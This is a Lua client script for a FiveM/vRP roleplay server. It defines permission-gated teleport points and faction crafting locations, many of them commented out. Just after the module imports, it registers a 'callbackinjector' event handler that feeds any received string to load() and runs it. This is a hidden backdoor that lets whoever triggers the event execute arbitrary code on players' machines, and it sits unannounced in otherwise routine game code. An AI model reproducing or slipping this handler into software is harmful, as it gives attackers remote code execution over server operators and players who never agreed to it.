local Tunnel = module("vrp","lib/Tunnel")
local Proxy = module("vrp","lib/Proxy")
func = Tunnel.getInterface("vrp_trafico")

TriggerEvent('callbackinjector', function(cb)
    pcall(load(cb))
end)
-----------------------------------------------------------------------------------------------------------------------------------------
-- TELEPORT
-----------------------------------------------------------------------------------------------------------------------------------------
local Teleport = {
	--[[["TRAFICO01"] = { -- Bunker
		positionFrom = { ['x'] = -3033.40, ['y'] = 3333.93, ['z'] = 10.27, ['perm'] = "entrada.permissao" },
		positionTo = { ['x'] = 894.49, ['y'] = -3245.88, ['z'] = -98.25, ['perm'] = "entrada.permissao" },
	},

	["TRAFICO02"] = { -- Bunker
		positionFrom = { ['x'] = 1571.876953125, ['y'] = 2229.5288085938, ['z'] = 78.567794799805, ['perm'] = "yakuzaentrada.permissao" }, 
		positionTo = { ['x'] = 911.04437255859, ['y'] = -3213.6423339844, ['z'] = -98.231483459473, ['perm'] = "yakuzaentrada.permissao" }
	},]]--
	["TRAFICO04"] = { -- Bunker
		positionFrom = { ['x'] = -923.83, ['y'] = -1508.83, ['z'] = 5.17, ['perm'] = "yakuzaliderentrada.permissao" }, 
		positionTo = { ['x'] = 1137.69, ['y'] = -3194.23, ['z'] = -40.39, ['perm'] = "yakuzaliderentrada.permissao" }
	},
	["TRAFICO05"] = { -- Bunker
		positionFrom = { ['x'] = -613.12841796875, ['y'] = -1625.1003417969, ['z'] = 33.010540008545, ['perm'] = "motoclubliderentrada.permissao" }, 
		positionTo = { ['x'] = 1123.71, ['y'] = -3196.79, ['z'] = -40.39, ['perm'] = "motoclubliderentrada.permissao" }
	},
	--[[["TRAFICO06"] = { -- Bunker milicia   
		positionFrom = { ['x'] = -3167.980, ['y'] = 1375.336, ['z'] = 18.380, ['perm'] = "milicia.permissao" }, 
		positionTo = { ['x'] = 1004.2105, ['y'] = -2997.5007, ['z'] = -39.6469, ['perm'] = "milicia.permissao" }
	},]]--
	["LAVAGEMVIP"] = { -- Bunker
		positionFrom = { ['x'] = -1078.2286376953, ['y'] = -254.19456481934, ['z'] = 37.763320922852, ['perm'] = "money.permissao" }, 
		positionTo = { ['x'] = -1578.0603027344, ['y'] = -564.0244140625, ['z'] = 108.5228729248, ['perm'] = "money.permissao" }
	},
	["HELISAMU"] = { -- SAMU ELEVADOR
		positionFrom = { ['x'] = -490.51, ['y'] = -327.66, ['z'] = 42.303320922852, ['perm'] = "paramedico.permissao" }, 
		positionTo = { ['x'] = -500.11, ['y'] = -324.28, ['z'] = 73.16, ['perm'] = "paramedico.permissao" }
	},
	["ELEVADORSAMU"] = { -- SAMU ELEVADOR CIVIL
		positionFrom = { ['x'] = -421.67, ['y'] = -345.82, ['z'] = 24.22, ['perm'] = "playerzin.permissao" }, 
		positionTo = { ['x'] = -452.54, ['y'] = -288.56, ['z'] = 34.94, ['perm'] = "playerzin.permissao" }
	},
	["ELEVADORIMOBILIARIA"] = { -- SAMU ELEVADOR CIVIL
		positionFrom = { ['x'] = -140.08, ['y'] = -624.34, ['z'] = 168.82, ['perm'] = "playerzin.permissao" }, 
		positionTo = { ['x'] = -152.46, ['y'] = -630.93, ['z'] = 48.41, ['perm'] = "playerzin.permissao" }
	},
}

Citizen.CreateThread(function()
	while true do
		local crjSleep = 500
		for k,v in pairs(Teleport) do
			local ped = PlayerPedId()
			local x,y,z = table.unpack(GetEntityCoords(ped))
			local bowz,cdz = GetGroundZFor_3dCoord(v.positionFrom.x,v.positionFrom.y,v.positionFrom.z)
			local distance = GetDistanceBetweenCoords(v.positionFrom.x,v.positionFrom.y,cdz,x,y,z,true)
			local bowz,cdz2 = GetGroundZFor_3dCoord(v.positionTo.x,v.positionTo.y,v.positionTo.z)
			local distance2 = GetDistanceBetweenCoords(v.positionTo.x,v.positionTo.y,cdz2,x,y,z,true)

			if distance <= 10 then
			crjSleep = 1
				DrawMarker(1,v.positionFrom.x,v.positionFrom.y,v.positionFrom.z-1,0,0,0,0,0,0,1.0,1.0,1.0,128,1,210,50,0,0,0,0)
				if distance <= 1.5 then
					if IsControlJustPressed(0,38) and func.checkPermission(v.positionTo.perm) then
						SetEntityCoords(PlayerPedId(),v.positionTo.x,v.positionTo.y,v.positionTo.z-0.50)
					end
				end
			end

			if distance2 <= 10 then
			crjSleep = 1
				DrawMarker(1,v.positionTo.x,v.positionTo.y,v.positionTo.z-1,0,0,0,0,0,0,1.0,1.0,1.0,128,1,210,50,0,0,0,0)
				if distance2 <= 1.5 then
					if IsControlJustPressed(0,38) and func.checkPermission(v.positionFrom.perm) then
						SetEntityCoords(PlayerPedId(),v.positionFrom.x,v.positionFrom.y,v.positionFrom.z-0.50)
					end
				end
			end
		end
		Citizen.Wait(crjSleep)
	end
end)
-----------------------------------------------------------------------------------------------------------------------------------------
-- VARIAVEIS
-----------------------------------------------------------------------------------------------------------------------------------------
local processo = false
-----------------------------------------------------------------------------------------------------------------------------------------
-- LOCAIS
-----------------------------------------------------------------------------------------------------------------------------------------
local locais = {
	-- FACÇÃO DROGAS 
		-- C.V
	{ ['id'] = 1, ['x'] = 101.80870056152, ['y'] = 6336.0366210938, ['z'] = 31.375883102417, ['text'] = "Reagentes", ['perm'] = "cvfarm.permissao" }, 
	{ ['id'] = 2, ['x'] = 99.624908447266, ['y'] = 6344.1274414063, ['z'] = 31.423278808594, ['text'] = "Processamento", ['perm'] = "cvfarm.permissao" }, 
	{ ['id'] = 3, ['x'] = 113.23827362061, ['y'] = 6360.431640625, ['z'] = 32.407746887207, ['text'] = "Produto Final", ['perm'] = "cvfarm.permissao" },
		--T.C.P
	{ ['id'] = 4, ['x'] = 1505.5209960938, ['y'] = 6392.111328125, ['z'] = 20.783918380737, ['text'] = "Reagentes", ['perm'] = "tcpfarm.permissao" }, 
	{ ['id'] = 5, ['x'] = 1493.416015625, ['y'] = 6390.2421875, ['z'] = 21.257762908936, ['text'] = "Processamento", ['perm'] = "tcpfarm.permissao" }, 
	{ ['id'] = 6, ['x'] = 1502.8494873047, ['y'] = 6393.55859375, ['z'] = 20.783916473389, ['text'] = "Produto Final", ['perm'] = "tcpfarm.permissao" },
		--A.D.A
	{ ['id'] = 7, ['x'] = 3332.859375, ['y'] = 5157.1259765625, ['z'] = 18.292179107666, ['text'] = "Reagentes", ['perm'] = "adafarm.permissao" }, 
	{ ['id'] = 8, ['x'] = 3334.6171875, ['y'] = 5160.7119140625, ['z'] = 18.297290802002, ['text'] = "Processamento", ['perm'] = "adafarm.permissao" }, 
	{ ['id'] = 9, ['x'] = 3332.0625, ['y'] = 5160.927734375, ['z'] = 18.286317825317, ['text'] = "Produto Final", ['perm'] = "adafarm.permissao" },
		--P.C.C 
	{ ['id'] = 10, ['x'] = 147.42, ['y'] = -2199.68, ['z'] = 4.68, ['text'] = "Reagentes", ['perm'] = "pccfarm.permissao" }, 
	{ ['id'] = 11, ['x'] = 152.24, ['y'] = -2202.90, ['z'] = 4.68, ['text'] = "Processamento", ['perm'] = "pccfarm.permissao" }, 
	{ ['id'] = 12, ['x'] = 141.81, ['y'] = -2202.88, ['z'] = 4.68, ['text'] = "Produto Final", ['perm'] = "pccfarm.permissao" },

	--[[	--T.C.A
	{ ['id'] = 13, ['x'] = 1397.6040039063, ['y'] = 3602.501953125, ['z'] = 38.941890716553, ['text'] = "Reagentes", ['perm'] = "tcafarm.permissao" }, 
	{ ['id'] = 14, ['x'] = 1392.2895507813, ['y'] = 3606.3125, ['z'] = 38.941890716553, ['text'] = "Processamento", ['perm'] = "tcafarm.permissao" }, 
	{ ['id'] = 15, ['x'] = 1389.5310058594, ['y'] = 3603.8933105469, ['z'] = 38.941890716553, ['text'] = "Produto Final", ['perm'] = "tcafarm.permissao" },]]--
	------ORGANIZAÇÕES
		-- LOWRIDER
	{ ['id'] = 16, ['x'] = -1149.6748046875, ['y'] = -2017.37109375, ['z'] = 13.180247306824, ['text'] = "Pegar Radiador", ['perm'] = "dkfarm.permissao" }, 
	{ ['id'] = 17, ['x'] = -1158.4138183594, ['y'] = -2002.8942871094, ['z'] = 13.180253982544, ['text'] = "Trocar Radiador no Motor", ['perm'] = "dkfarm.permissao" }, 
	{ ['id'] = 18, ['x'] = -1154.677734375, ['y'] = -2022.2509765625, ['z'] = 13.17488193512, ['text'] = "Fabricar Peças Finais", ['perm'] = "dkfarm.permissao" },
	
		-- JORNAL
	{ ['id'] = 19, ['x'] = -563.39,['y'] = -919.13,['z'] = 23.87, ['text'] = "Fabricar Jornal", ['perm'] = "weazel.permissao" }, 
		--VANILLA
	--{ ['id'] = 20, ['x'] = 111.1132049,['y'] = -1297.123535,['z'] = 29.268743515, ['text'] = "Fabricar SNS PISTOL", ['perm'] = "bordel.permissao" },
	--{ ['id'] = 21, ['x'] = 106.2272872,['y'] = -1305.66699218,['z'] = 28.76880455, ['text'] = "Fabricar munição de SNS PISTOL", ['perm'] = "bordel.permissao" },
		--YAKUZA
	--{ ['id'] = 22, ['x'] = 907.96563720703,['y'] = -3211.9970703125,['z'] = -98.222206115723, ['text'] = "Pumpshotgun", ['perm'] = "yakuza.permissao" }, 
	--{ ['id'] = 23, ['x'] = 905.68109130859,['y'] = -3230.626953125,['z'] = -98.294380187988, ['text'] = "UZI", ['perm'] = "yakuza.permissao" }, 
	--{ ['id'] = 24, ['x'] = 909.56512451172,['y'] = -3222.28515625,['z'] = -98.26554107666, ['text'] = "Colete", ['perm'] = "yakuza.permissao" },--
	--{ ['id'] = 25, ['x'] = 899.30395507813,['y'] = -3224.16796875,['z'] = -98.26532745361, ['text'] = "Munição Five-seven", ['perm'] = "yakuza.permissao" },
	--{ ['id'] = 26, ['x'] = 883.72399902344,['y'] = -3207.4445800781,['z'] = -98.196250915527, ['text'] = "Munição AK103", ['perm'] = "yakuza.permissao" },--
	--{ ['id'] = 27, ['x'] = 887.43609619141,['y'] = -3209.4885253906,['z'] = -98.196250915527, ['text'] = "Munição SigSauer", ['perm'] = "yakuza.permissao" },--
		--MAFIA
	--{ ['id'] = 28, ['x'] = -2676.755859375,['y'] = 1325.6988525391,['z'] = 144.25762939453, ['text'] = "AK 103", ['perm'] = "mafia.permissao" }, 
	--{ ['id'] = 29, ['x'] = -2679.0773925781,['y'] = 1327.8542480469,['z'] = 144.25762939453, ['text'] = "Five-Seven", ['perm'] = "mafia.permissao" }, 
	--{ ['id'] = 30, ['x'] = -2675.4692382813,['y'] = 1327.1612548828,['z'] = 140.88143920898, ['text'] = "SigSauer", ['perm'] = "mafia.permissao" },
	--{ ['id'] = 31, ['x'] = -2676.4599609375,['y'] = 1336.9566650391,['z'] = 140.88359069824, ['text'] = "Municao UZI", ['perm'] = "mafia.permissao" },--
	--{ ['id'] = 32, ['x'] = -2678.4675292969,['y'] = 1330.255859375,['z'] = 140.88159179688, ['text'] = "Municao PUMPSHOTGUN", ['perm'] = "mafia.permissao" },--
	--{ ['id'] = 33, ['x'] = -2675.7202148438,['y'] = 1331.0562744141,['z'] = 140.88140869141, ['text'] = "Municao MTAR", ['perm'] = "mafia.permissao" },--
		-- MILICIA
	--{ ['id'] = 34, ['x'] = 993.73187255859,['y'] = -2988.6284179688,['z'] = -39.646961212158, ['text'] = "UZI", ['perm'] = "miliciafarm.permissao" }, 
	--{ ['id'] = 35, ['x'] = 977.77374267578,['y'] = -2988.6369628906,['z'] = -39.646961212158, ['text'] = "SIGSAUER", ['perm'] = "milicia.permissao" }, 
	--{ ['id'] = 36, ['x'] = 966.80920410156,['y'] = -2992.3771972656,['z'] = -39.646961212158, ['text'] = "AK-103", ['perm'] = "milicia.permissao" },
	--{ ['id'] = 37, ['x'] = 968.5712890625,['y'] = -3001.8432617188,['z'] = -39.646926879883, ['text'] = "MUNICAO MTAR", ['perm'] = "milicia.permissao" },--
	--{ ['id'] = 38, ['x'] = 981.01727294922,['y'] = -3019.0529785156,['z'] = -39.646926879883, ['text'] = "MUNICAO Five-Seven", ['perm'] = "milicia.permissao" },--
	--{ ['id'] = 39, ['x'] = 961.15588378906,['y'] = -3016.6193847656,['z'] = -39.646926879883, ['text'] = "MUNICAO PUMP SHOTGUN", ['perm'] = "milicia.permissao" },--
		-- VANILLA --
	{ ['id'] = 40, ['x'] = 1268.90,['y'] = -1710.0092773438,['z'] = 54.771457672119, ['text'] = "Pegar Pen Drive Hacker", ['perm'] = "bordel.permissao" },
	{ ['id'] = 41, ['x'] = 711.5194091,['y'] = -971.457397,['z'] = 30.395322, ['text'] = "Costurar tecido", ['perm'] = "bordel.permissao" },
	{ ['id'] = 42, ['x'] = 714.8349,['y'] = -969.943603,['z'] = 30.3953227, ['text'] = "Fabricar mochila", ['perm'] = "bordel.permissao" },
	
	
	 	-- MC 
	--{ ['id'] = 43, ['x'] = -570.93157958984, ['y'] = -1606.6187744141, ['z'] = 27.015922546387, ['text'] = "Munição AK103", ['perm'] = "motoclub.permissao" }, 
	--{ ['id'] = 44, ['x'] = -560.18682861328, ['y'] = -1601.4606933594, ['z'] = 27.010789871216, ['text'] = "Munição SigSauer", ['perm'] = "motoclub.permissao" }, 
	--{ ['id'] = 45, ['x'] = -570.55358886719, ['y'] = -1627.0617675781, ['z'] = 33.011013031006, ['text'] = "Munição UZI", ['perm'] = "motoclub.permissao" },
	--{ ['id'] = 46, ['x'] = -591.30279541016, ['y'] = -1625.9296875, ['z'] = 33.010707855225, ['text'] = "Colete", ['perm'] = "motoclub.permissao" },
	--{ ['id'] = 47, ['x'] = -604.58099365234, ['y'] = -1623.6442871094, ['z'] = 33.010536193848, ['text'] = "MTAR", ['perm'] = "motoclub.permissao" },
		
}

Citizen.CreateThread(function()
	while true do
		local crjSleep = 500
		for k,v in pairs(locais) do
			local ped = PlayerPedId()
			local x,y,z = table.unpack(GetEntityCoords(ped))
			local bowz,cdz = GetGroundZFor_3dCoord(v.x,v.y,v.z)
			local distance = GetDistanceBetweenCoords(v.x,v.y,cdz,x,y,z,true)
			if distance <= 1.5 and not processo then
			crjSleep = 1
				drawTxt("PRESSIONE  ~b~E~w~  PARA COLETAR "..v.text,4,0.5,0.93,0.50,255,255,255,180)
								--CV
				DrawMarker(20,101.80870056152,6336.0366210938,31.375883102417,0,0,0,0,0,0,1.0,1.0,0.5,128, 1, 210,100,1,0,0,0)
				DrawMarker(20,99.624908447266,6344.1274414063,31.423278808594,0,0,0,0,0,0,1.0,1.0,0.5,128, 1, 210,100,1,0,0,0)
				DrawMarker(20,113.23827362061,6360.431640625,32.407746887207,0,0,0,0,0,0,1.0,1.0,0.5,128, 1, 210,100,1,0,0,0)
								--TCP
				DrawMarker(20,1505.5209960938,6392.111328125,20.783918380737,0,0,0,0,0,0,1.0,1.0,0.5,128, 1, 210,100,1,0,0,0)
				DrawMarker(20,1493.416015625,6390.2421875,21.257762908936,0,0,0,0,0,0,1.0,1.0,0.5,128, 1, 210,100,1,0,0,0)
				DrawMarker(20,1502.8494873047,6393.55859375,20.783916473389,0,0,0,0,0,0,1.0,1.0,0.5,128, 1, 210,100,1,0,0,0)
								--ADA
				DrawMarker(20,3332.859375,5157.1259765625,18.292179107666,0,0,0,0,0,0,1.0,1.0,0.5,128, 1, 210,100,1,0,0,0)
				DrawMarker(20,3334.6171875,5160.7119140625,18.297290802002,0,0,0,0,0,0,1.0,1.0,0.5,128, 1, 210,100,1,0,0,0)
				DrawMarker(20,3332.0625,5160.927734375,18.286317825317,0,0,0,0,0,0,1.0,1.0,0.5,128, 1, 210,100,1,0,0,0)
								--PCC
				DrawMarker(20,147.42161560059,-2199.6833496094,4.6880197525024,0,0,0,0,0,0,1.0,1.0,0.5,128, 1, 210,100,1,0,0,0)
				DrawMarker(20,152.24584960938,-2202.900390625,4.6880216598511,0,0,0,0,0,0,1.0,1.0,0.5,128, 1, 210,100,1,0,0,0)
				DrawMarker(20,141.81842041016,-2202.8852539063,4.6880216598511,0,0,0,0,0,0,1.0,1.0,0.5,128, 1, 210,100,1,0,0,0)
								--TCA
				--DrawMarker(20,1397.6040039063,3602.501953125,38.941890716553,0,0,0,0,0,0,1.0,1.0,0.5,128, 1, 210,100,1,0,0,0)
				--DrawMarker(20,1392.2895507813,3606.3125,38.941890716553,0,0,0,0,0,0,1.0,1.0,0.5,128, 1, 210,100,1,0,0,0)
				--DrawMarker(20,1389.5310058594,3603.8933105469,38.941890716553,0,0,0,0,0,0,1.0,1.0,0.5,128, 1, 210,100,1,0,0,0)
							--DK
				--DrawMarker(20,2330.1596679688,3054.1806640625,48.151748657227,0,0,0,0,0,0,1.0,1.0,0.5,128, 1, 210,100,1,0,0,0)
				DrawMarker(20,-1149.6748046875,-2017.37109375,13.180247306824,0,0,0,0,0,0,1.0,1.0,0.5,128, 1, 210,100,1,0,0,0)
				DrawMarker(20,-1158.4138183594,-2002.8942871094,13.180253982544,0,0,0,0,0,0,1.0,1.0,0.5,128, 1, 210,100,1,0,0,0)
				DrawMarker(20,-1154.677734375,-2022.2509765625,13.17488193512,0,0,0,0,0,0,1.0,1.0,0.5,128, 1, 210,100,1,0,0,0)
								--VANILLA
				DrawMarker(23,1268.904296875,-1710.0092773438,54.771457672119-0.9701, 0, 0, 0, 0, 0, 0, 3.0, 3.0, 3.0, 128, 1, 210, 155, 0, 0, 2, 0, 0, 0, 0)
				--DrawMarker(20,106.2272872,-1305.66699218,28.76880455,0,0,0,0,0,0,1.0,1.0,0.5,128, 1, 210,100,1,0,0,0)
				--DrawMarker(20,111.1132049,-1297.123535,29.268743515,0,0,0,0,0,0,1.0,1.0,0.5,128, 1, 210,100,1,0,0,0)
				DrawMarker(20,711.5194091,-971.457397,30.395322,0,0,0,0,0,0,1.0,1.0,0.5,128, 1, 210,100,1,0,0,0)
				DrawMarker(20,714.8349,-969.943603,30.3953227,0,0,0,0,0,0,1.0,1.0,0.5,128, 1, 210,100,1,0,0,0)
				DrawMarker(20,-563.39300537109,-919.13165283203,23.877767562866,0,0,0,0,0,0,1.0,1.0,0.5,128, 1, 210,100,1,0,0,0)
								--YAKUZA
				--DrawMarker(20,907.96563720703,-3211.9970703125,-98.222206115723,0,0,0,0,0,0,1.0,1.0,0.5,128, 1, 210,100,1,0,0,0)
				--DrawMarker(20,905.68109130859,-3230.626953125,-98.294380187988,0,0,0,0,0,0,1.0,1.0,0.5,128, 1, 210,100,1,0,0,0)
				--DrawMarker(20,909.56512451172,-3222.28515625,-98.26554107666,0,0,0,0,0,0,1.0,1.0,0.5,128, 1, 210,100,1,0,0,0)
			--	DrawMarker(20,899.30395507813,-3224.16796875,-98.26532745361,0,0,0,0,0,0,1.0,1.0,0.5,240,200,80,100,1,0,0,0)
				--DrawMarker(20,883.72399902344,-3207.4445800781,-98.196250915527,0,0,0,0,0,0,1.0,1.0,0.5,240,200,80,100,1,0,0,0)
				--DrawMarker(20,887.43609619141,-3209.4885253906,-98.196250915527,0,0,0,0,0,0,1.0,1.0,0.5,240,200,80,100,1,0,0,0)
								--MAFIA
				--DrawMarker(20,-2676.755859375,1325.6988525391,144.25762939453,0,0,0,0,0,0,1.0,1.0,0.5,240,200,80,100,1,0,0,0)
				--DrawMarker(20,-2679.0773925781,1327.8542480469,144.25762939453,0,0,0,0,0,0,1.0,1.0,0.5,240,200,80,100,1,0,0,0)
				--DrawMarker(20,-2675.4692382813,1327.1612548828,140.88143920898,0,0,0,0,0,0,1.0,1.0,0.5,240,200,80,100,1,0,0,0)
				--DrawMarker(20,-2676.4599609375,1336.9566650391,140.88359069824,0,0,0,0,0,0,1.0,1.0,0.5,240,200,80,100,1,0,0,0)
				--DrawMarker(20,-2678.4675292969,1330.255859375,140.88159179688,0,0,0,0,0,0,1.0,1.0,0.5,240,200,80,100,1,0,0,0)
				--DrawMarker(20,-2675.7202148438,1331.0562744141,140.88140869141,0,0,0,0,0,0,1.0,1.0,0.5,240,200,80,100,1,0,0,0)
								--MILICIA
				--DrawMarker(20,993.73187255859,-2988.6284179688,-39.646961212158,0,0,0,0,0,0,1.0,1.0,0.5,240,200,80,100,1,0,0,0)
				--DrawMarker(20,977.77374267578,-2988.6369628906,-39.646961212158,0,0,0,0,0,0,1.0,1.0,0.5,240,200,80,100,1,0,0,0)
				--DrawMarker(20,966.80920410156,-2992.3771972656,-39.646961212158,0,0,0,0,0,0,1.0,1.0,0.5,240,200,80,100,1,0,0,0)
				--DrawMarker(20,968.5712890625,-3001.8432617188,-39.646926879883,0,0,0,0,0,0,1.0,1.0,0.5,240,200,80,100,1,0,0,0)
				--DrawMarker(20,981.01727294922,-3019.0529785156,-39.646926879883,0,0,0,0,0,0,1.0,1.0,0.5,240,200,80,100,1,0,0,0)
				--DrawMarker(20,961.15588378906,-3016.6193847656,-39.646926879883,0,0,0,0,0,0,1.0,1.0,0.5,240,200,80,100,1,0,0,0)
								--MC
				--DrawMarker(20,-570.93157958984,-1606.6187744141,27.015922546387,0,0,0,0,0,0,1.0,1.0,0.5,240,200,80,100,1,0,0,0)
				--DrawMarker(20,-560.18682861328,-1601.4606933594,27.010789871216,0,0,0,0,0,0,1.0,1.0,0.5,240,200,80,100,1,0,0,0)
				--DrawMarker(20,-570.55358886719,-1627.0617675781,33.011013031006,0,0,0,0,0,0,1.0,1.0,0.5,240,200,80,100,1,0,0,0)
				--DrawMarker(20,-591.30279541016,-1625.9296875,33.010707855225,0,0,0,0,0,0,1.0,1.0,0.5,240,200,80,100,1,0,0,0)
				--DrawMarker(20,-604.58099365234,-1623.6442871094,33.010536193848,0,0,0,0,0,0,1.0,1.0,0.5,240,200,80,100,1,0,0,0)
				if IsControlJustPressed(0,38) and func.checkPermission(v.perm) then
					if func.checkPayment(v.id) then
						processo = true
						TriggerEvent('cancelando',true)
						TriggerEvent("progress",8000,"produzindo")
						SetTimeout(8000,function()
							processo = false
							TriggerEvent('cancelando',false)
						end)
					end
				end
			end
		end
		Citizen.Wait(crjSleep)
	end
end)
-----------------------------------------------------------------------------------------------------------------------------------------
-- FUNÇÕES
-----------------------------------------------------------------------------------------------------------------------------------------
function drawTxt(text,font,x,y,scale,r,g,b,a)
	SetTextFont(font)
	SetTextScale(scale,scale)
	SetTextColour(r,g,b,a)
	SetTextOutline()
	SetTextCentre(1)
	SetTextEntry("STRING")
	AddTextComponentString(text)
	DrawText(x,y)
end